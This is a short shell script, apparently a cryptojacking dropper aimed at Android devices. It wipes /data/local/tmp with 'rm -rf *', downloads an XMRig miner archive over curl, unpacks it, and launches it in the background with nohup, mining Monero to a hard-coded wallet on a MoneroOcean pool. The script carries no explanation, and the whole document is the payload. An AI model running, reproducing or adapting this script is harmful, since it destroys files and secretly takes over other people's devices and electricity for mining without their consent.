cd /data/local/tmp
rm -rf *
curl -L -o /data/local/tmp/xmrig.tar.gz https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
tar -xvzf xmrig.tar.gz
nohup ./xmrig -o gulf.moneroocean.stream:10128 -u 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG.worker456834 -k --tls